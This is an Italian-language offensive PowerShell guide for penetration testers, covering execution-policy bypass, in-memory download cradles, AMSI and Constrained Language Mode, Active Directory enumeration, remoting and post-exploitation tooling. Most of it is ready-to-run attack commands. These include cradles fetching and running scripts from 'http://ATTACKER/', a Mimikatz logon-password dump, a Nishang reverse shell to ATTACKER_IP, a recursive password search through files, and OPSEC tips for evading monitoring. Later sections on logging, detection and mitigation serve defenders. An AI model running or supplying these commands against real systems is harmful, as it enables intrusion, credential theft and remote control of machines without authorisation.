---
title: 'PowerShell per Penetration Testing: Guida Offensiva Completa'
slug: powershell
description: 'PowerShell per pentest Windows: comandi, download, remoting, enumerazione Active Directory, logging, AMSI, CLM e tecniche di post-exploitation.'
image: /powershell-penetration-testing.webp
draft: false
date: 2026-07-13T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - powershell
  - lateral movement
  - amsi
---

# PowerShell per Etichal Hacker : Comandi, Active Directory e Post-Exploitation

**In sintesi:** PowerShell è integrato in ogni macchina Windows moderna, ha accesso completo al .NET framework, alle API Win32, a WMI e a [Active Directory](https://hackita.it/articoli/active-directory/) — senza installare nulla. Per un pentester è il tool di post-exploitation più versatile disponibile sull'host compromesso, usabile sia per enumeration che per lateral movement.

***

PowerShell non è un tool offensivo di terze parti — è la shell di amministrazione nativa di Microsoft, presente e abilitata di default su ogni macchina Windows 7/Server 2008 R2 in poi. Questo lo rende uno degli strumenti più potenti e discreti per un pentester: non richiede drop di binari sospetti, firma i comandi con credenziali di dominio reali, e ha accesso nativo a quasi ogni API del sistema operativo.

> **Key Takeaway:** PowerShell non è solo uno strumento di automazione — è un'interfaccia completa al sistema operativo Windows. Chi sa usarlo bene non ha bisogno di caricare tool di terze parti per la maggior parte delle operazioni di post-exploitation.

Classificato da MITRE ATT\&CK come [T1059.001](https://attack.mitre.org/techniques/T1059/001/).

***

## Versioni e Differenze

| Versione               | Base                   | Disponibilità                                        | Rilevanza offensiva                                                               |
| ---------------------- | ---------------------- | ---------------------------------------------------- | --------------------------------------------------------------------------------- |
| Windows PowerShell 2.0 | .NET Framework         | Sistemi legacy (rimosso da Win11 24H2 e Server 2025) | Niente AMSI/ScriptBlock logging moderno, ma rilevabile via process creation e EDR |
| Windows PowerShell 5.1 | .NET Framework         | Windows 7 SP1+ / Server 2008 R2+                     | AMSI e Script Block Logging da Windows 10+; standard su sistemi supportati        |
| PowerShell 7.x         | .NET Core/.NET moderno | Installazione separata, affiancata a PS 5.1          | Cross-platform; AMSI supportato; PS 7.3+ estende monitoraggio alle chiamate .NET  |

```powershell
# Verifica versione corrente
$PSVersionTable.PSVersion

# PowerShell 7 viene installato affiancato a Windows PowerShell 5.1, non lo sostituisce
# Monitora sia powershell.exe che pwsh.exe: in ambienti aziendali pwsh.exe è raro
```

***

## Cheat Sheet — Comandi Offensivi Essenziali

| Obiettivo                           | Comando                                                                                                                                                                      |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Bypass execution policy (sessione)  | `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`                                                                                                                 |
| Bypass execution policy (one-liner) | `powershell -ep bypass -c "..."`                                                                                                                                             |
| Comando in Base64                   | `powershell -enc <BASE64>`                                                                                                                                                   |
| Genera comando Base64               | `$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami")); powershell -enc $enc`                                                                 |
| Download + esecuzione in memoria    | `IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')`                                                                                                 |
| Download + esecuzione IWR           | `IEX(Invoke-WebRequest 'http://ATTACKER/script.ps1' -UseBasicParsing).Content`                                                                                               |
| Verifica CLM                        | `$ExecutionContext.SessionState.LanguageMode`                                                                                                                                |
| Esecuzione remota WinRM             | `Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }`                                                                                              |
| Sessione interattiva WinRM          | `Enter-PSSession -ComputerName TARGET -Credential $cred`                                                                                                                     |
| Crea credential object              | `$cred = New-Object PSCredential("corp\admin", (ConvertTo-SecureString 'Pass' -AsPlainText -Force))`                                                                         |
| Avvia processo con credenziali      | `Start-Process powershell -Credential $cred -ArgumentList "-nop -w hidden -c IEX(...)"`                                                                                      |
| CIM remoto (moderno)                | `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd /c whoami'} -CimSession (New-CimSession -ComputerName TARGET -Credential $cred)` |
| WMI remoto (legacy)                 | `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" -ComputerName TARGET -Credential $cred`                                                    |
| Cerca password in file              | `Get-ChildItem C:\ -Recurse -Include "*.xml","*.ps1","*.config" -EA SilentlyContinue \| Select-String -Pattern "password\|passwd\|pwd"`                                      |
| Stato Defender                      | `Get-MpComputerStatus \| Select-Object AMRunningMode, AntivirusEnabled`                                                                                                      |

***

## Execution Policy Bypass

L'Execution Policy non è un controllo di sicurezza — è una misura di protezione dagli errori accidentali. Non impedisce l'esecuzione di codice, solo carica gli script con determinate restrizioni.

```powershell
# Verifica policy attuale
Get-ExecutionPolicy -List

# Bypass — nessuno richiede privilegi elevati
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(Get-Content script.ps1 -Raw)"

# Temporaneo per la sessione corrente
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Trasporto tramite Base64 — non garantisce bypass AMSI/logging
# Base64 è solo una codifica; PowerShell la decodifica prima dell'esecuzione
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
```

**Nota importante:** l'uso di `-enc` (EncodedCommand) trasporta il comando in Base64, ma PowerShell de-codifica il contenuto prima dell'esecuzione — AMSI e Script Block Logging ispezionano il codice decodificato, non il Base64 di trasporto.

***

## Download Cradle — Trasferimento File in Memoria

Carica ed esegui script PowerShell direttamente in memoria senza scrivere su disco — il metodo principale per caricare tool come PowerView, PowerUp, Mimikatz, ecc.

### Varianti di Download

```powershell
# Net.WebClient — il classico
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')

# Versione con variabile (meno riconoscibile inline)
$wc = New-Object Net.WebClient
IEX($wc.DownloadString('http://ATTACKER/script.ps1'))

# Invoke-WebRequest (PS 3.0+)
IEX(Invoke-WebRequest 'http://ATTACKER/script.ps1' -UseBasicParsing).Content

# WebClient alternativo — se Net.WebClient viene flaggato da AMSI
IEX([System.Net.WebClient]::new().DownloadString('http://ATTACKER/script.ps1'))

# BITS Transfer — usa il servizio Background Intelligent Transfer Service (legittimo)
Start-BitsTransfer -Source 'http://ATTACKER/script.ps1' -Destination 'C:\Windows\Temp\s.ps1'
. 'C:\Windows\Temp\s.ps1'

# HTTPS con certificato self-signed
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX(New-Object Net.WebClient).DownloadString('https://ATTACKER/script.ps1')
```

### Artefatti Prodotti

Tutti i download cradle generano artefatti rilevabili:

* **Event ID 4688** — avvio di `powershell.exe` e command line
* **Network detection** — connessioni HTTP/HTTPS da `powershell.exe` verso IP non corporate
* **Script Block Logging (4104)** — contenuto dell'IEX dopo esecuzione
* **AMSI** — rilevamento del payload se noto

***

## AMSI (Antimalware Scan Interface)

A partire da **Windows PowerShell 5.1 su Windows 10 e versioni successive**, PowerShell invia gli ScriptBlock ad AMSI prima dell'esecuzione. PowerShell 7.3 ha esteso l'ispezione includendo anche le chiamate ai metodi .NET.

```powershell
# Verifica se AMSI è attivo nella sessione corrente
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)
# True = bypass possibile già attivo, False = AMSI funzionante
```

AMSI invia il contenuto dello script all'antivirus installato (es. Windows Defender) che può bloccare l'esecuzione. Le tecniche di bypass cambiano rapidamente con gli aggiornamenti di Defender.

**Categoria di bypass storiche:**

* **Memory patching** — patch delle funzioni in `amsi.dll` a runtime via reflection .NET
* **Initialization failure** — corrompe lo stato dell'istanza AMSI prima dell'utilizzo
* **Obfuscation** — strumenti come [amsi.fail](https://amsi.fail) generano snippet obfuscati contro le signature correnti

> Per bypass aggiornati: [amsi.fail](https://amsi.fail) e [S3cur3Th1sSh1t GitHub](https://github.com/S3cur3Th1sSh1t).

***

## Constrained Language Mode (CLM)

CLM è una restrizione di PowerShell che limita i tipi .NET accessibili e blocca molti comandi offensivi. Viene attivato da AppLocker o **App Control for Business/WDAC** in ambienti hardened.

```powershell
# Verifica language mode corrente
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = nessuna restrizione
# ConstrainedLanguage = CLM attivo
```

Se CLM è attivo, script come PowerView, PowerUp e altri tool offensivi non funzioneranno — richiedono FullLanguage.

### Limitazioni e Possibili Contromisure

Le tecniche storicamente usate contro CLM (downgrade a PS 2.0, custom runspace, LOLBin come MSBuild) dipendono da come AppLocker o App Control sono configurati. Un ambiente con **App Control for Business/WDAC** correttamente distribuito non viene aggirato automaticamente usando runspace alternativi, PowerShell 2.0 o LOLBin — la policy si applica a livello di sistema operativo, non solo alla sessione PowerShell.

Microsoft raccomanda WDAC rispetto ad AppLocker (su cui non sta più investendo salvo aggiornamenti di sicurezza).

```powershell
# Controlla se PS 2.0 è disponibile (solo su sistemi legacy)
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```

***

## Enumerazione di Active Directory

### Con il Modulo ActiveDirectory

Disponibile su DC e macchine con RSAT installato:

```powershell
Import-Module ActiveDirectory

# Info sul dominio corrente
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Tutti gli utenti
Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, MemberOf, PasswordLastSet

# Tutti i computer
Get-ADComputer -Filter * -Properties * | Select-Object Name, OperatingSystem, DNSHostName

# Domain Admin members (ricorsivo)
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Service account con SPN (target Kerberoasting)
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Properties ServicePrincipalName

# Utenti con pre-auth disabilitata (target AS-REP Roasting)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Domain Controller nel dominio
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
```

### ADSI Searcher (senza RSAT)

Funziona su qualsiasi macchina joinata al dominio:

```powershell
# Cerca utenti con ADSI
$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user))"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }

# Cerca computer
$searcher = [adsisearcher]"(objectCategory=computer)"
$searcher.FindAll() | ForEach-Object { $_.Properties["dnshostname"] }

# Cerca gruppi privilegiati
$searcher = [adsisearcher]"(&(objectCategory=group)(name=Domain Admins))"
$searcher.FindOne().Properties["member"]
```

***

## Remoting e Credenziali

### Credential Objects

```powershell
# Crea credential object da usare con cmdlet remoti
$cred = New-Object System.Management.Automation.PSCredential(
  "corp\administrator", 
  (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
)
```

### WinRM (Preferred)

```powershell
# Sessione remota interattiva
Enter-PSSession -ComputerName TARGET -Credential $cred

# Esecuzione remota one-liner
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }

# Su più macchine in parallelo
Invoke-Command -ComputerName (Get-Content hosts.txt) -Credential $cred `
  -ScriptBlock { whoami }

# Con timeout e salto di host
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami } `
  -OperationTimeoutSec 10
```

### Avvio Processo con Credenziali Diverse

```powershell
# Avvia un processo locale utilizzando le credenziali specificate
Start-Process powershell -Credential $cred `
  -ArgumentList "-nop -w hidden -ep bypass -c IEX(...)"
```

**Nota:** `Start-Process -Credential` esegue il processo come l'account specificato. Se hai bisogno di usare le credenziali **solo per l'accesso di rete** mantenendo l'identità locale corrente, usa `runas /netonly` da cmd.exe.

### CIM (Recommended per Remoting Moderno)

```powershell
# Crea sessione CIM
$session = New-CimSession -ComputerName TARGET -Credential $cred

# Esecuzione remota via CIM
Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
  -Arguments @{CommandLine='cmd.exe /c whoami > C:\temp\out.txt'} `
  -CimSession $session
```

### WMI (Legacy)

```powershell
# Esecuzione remota via WMI (alternativa a CIM, meno moderno)
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" `
  -ComputerName TARGET -Credential $cred
```

***

## Caricamento di Tool Offensivi

### PowerView — Enumerazione AD

```powershell
# Carica PowerView in memoria
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

# Enumera utenti con GenericAll
Get-DomainUser -Properties objectsid | Get-ObjectAcl -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -like '*GenericAll*'}
```

### Mimikatz via PowerShell

```powershell
# Carica Invoke-Mimikatz in memoria
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1')

# Dump credenziali
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### Nishang — Framework Offensivo

```powershell
# Reverse shell TCP
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# Bind shell
Invoke-PowerShellTcp -Bind -Port 4444
```

***

## Logging, Auditing e Detection

PowerShell genera diversi tipi di log rilevanti per un SOC:

| Funzione             | Event ID      | Cosa registra                                               |
| -------------------- | ------------- | ----------------------------------------------------------- |
| Script Block Logging | 4104          | Contenuto degli ScriptBlock elaborati prima dell'esecuzione |
| Module Logging       | 4103          | Dettagli sull'esecuzione dei comandi dei moduli configurati |
| Transcription        | File di testo | Input e output completo delle sessioni PowerShell           |
| Process Creation     | 4688          | Avvio di `powershell.exe` e, se configurato, command line   |

**Nota:** Script Block Logging, Module Logging e Transcription **non sono automaticamente attivi** — richiedono configurazione tramite Group Policy, registro di sistema o profilo PowerShell.

### Protected Event Logging

Poiché questi log possono contenere password, token e dati sensibili, Microsoft raccomanda l'uso di **Protected Event Logging** quando Script Block Logging viene impiegato oltre la semplice diagnostica.

```powershell
# Verifica se Script Block Logging è abilitato
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -ErrorAction SilentlyContinue

# Verifica se Module Logging è abilitato
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -ErrorAction SilentlyContinue
```

***

## Detection

**🔴 HIGH:**

* **Event ID 4104** — ScriptBlock con contenuto offensivo noto (IEX, DownloadString, AMSI bypass keywords)
* **Event ID 4688** con command line contenente `-enc`, `-EncodedCommand`, `-ep bypass`, `-nop`
* Processo `powershell.exe` che genera connessioni di rete outbound verso IP non corporate
* Combinazione di script download (4104) + esecuzione WinRM remota (4688 con Invoke-Command)

**🟡 MEDIUM:**

* Download Cradle verso IP non corporate (Net.WebClient.DownloadString rilevato)
* Sessioni WinRM verso macchine inusuali
* Uso di cmdlet AD in sequenza rapida (indicativo di enumerazione)

***

## Mitigazione

* Abilitare **Script Block Logging** (Event ID 4104) e centralizzare i log in un SIEM
* Attivare **Constrained Language Mode** tramite App Control for Business/WDAC — aumenta significativamente la difficoltà di sfruttamento
* Disabilitare **PowerShell 2.0** dove non necessario (rimosso automaticamente su Win11 24H2 e Server 2025)
* Forzare **PowerShell 5.1+** e monitorare qualsiasi tentativo di downgrade
* **Windows Defender Application Control (WDAC)** per bloccare script non firmati
* Monitorare connessioni di rete originate da `powershell.exe` e `pwsh.exe` verso IP non corporate
* Implementare **Protected Event Logging** per proteggere i dati sensibili nei log di Script Block Logging

***

## OPSEC

* Usa `-WindowStyle Hidden` e `-NoProfile` per non aprire finestre visibili e non caricare profili user
* Preferisci esecuzione in memoria (download cradle) al drop di file su disco
* Su sistemi con Script Block Logging, **ogni comando viene loggato** — inclusi quelli obfuscati dopo il parsing. L'obfuscation bypassa solo il rilevamento signature prima del parsing, non il logging stesso
* `powershell.exe` come processo padre è un segnale di alert — in ambienti monitorati preferisci remoting tramite WinRM via credenziali legittime
* In ambienti con WDAC, PowerShell 7 (`pwsh.exe`) potrebbe essere meno bloccato di `powershell.exe`, ma è anche più anomalo — usa con consapevolezza
* Download Cradle genera artefatti di rete e processo — mantieni il timing coerente con il comportamento dell'account

***

## FAQ

**Constrained Language Mode blocca completamente PowerShell offensivo?**
Rende molto più difficile l'uso di script offensivi come PowerView o PowerUp, che richiedono FullLanguage. Non blocca completamente l'uso di PowerShell ma elimina la maggior parte dei vettori di abuso comuni se WDAC è configurato correttamente.

**Script Block Logging registra anche i comandi obfuscati?**
Sì — PowerShell de-obfusca il codice prima dell'esecuzione e logga il contenuto reale. L'obfuscation bypassa solo il rilevamento signature prima del parsing, non il logging stesso.

**PowerShell 7 ha le stesse protezioni di Windows PowerShell 5.1?**
PowerShell 7 supporta AMSI e ha accesso agli stessi controlli di sicurezza, ma alcune policy di Group Policy non si applicano a `pwsh.exe` per impostazione predefinita — è un'area da verificare in ogni ambiente.

**Posso eseguire WinRM remoto senza credenziali esplicite?**
Sì, se l'account locale ha già delegazione Kerberos verso il target o esiste un trust tra i domini. `Invoke-Command` usa le credenziali della sessione corrente per default.

***

## Conclusione

PowerShell rimane uno degli strumenti più potenti nel toolkit offensivo Windows proprio perché è nativo, affidabile, e difficile da bloccare completamente senza impattare le operazioni IT legittime. La tensione tra usabilità amministrativa e sicurezza offensiva non si risolve facilmente — ogni ambiente è un compromesso.

Per chi difende, la priorità è logging centralizzato, Protected Event Logging, e WDAC. Per chi attacca, conoscere i meccanismi di detection e logging è prerequisito per lavorare in modo efficace in ambienti monitorati.

***

**Risorse:**

* [MITRE ATT\&CK – T1059.001](https://attack.mitre.org/techniques/T1059/001/)
* [HackTricks – PowerShell](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html)
* [Microsoft Learn – PowerShell Security Features](https://learn.microsoft.com/en-us/powershell/scripting/security/security-features)
* [amsi.fail – AMSI Bypass Snippets](https://amsi.fail)
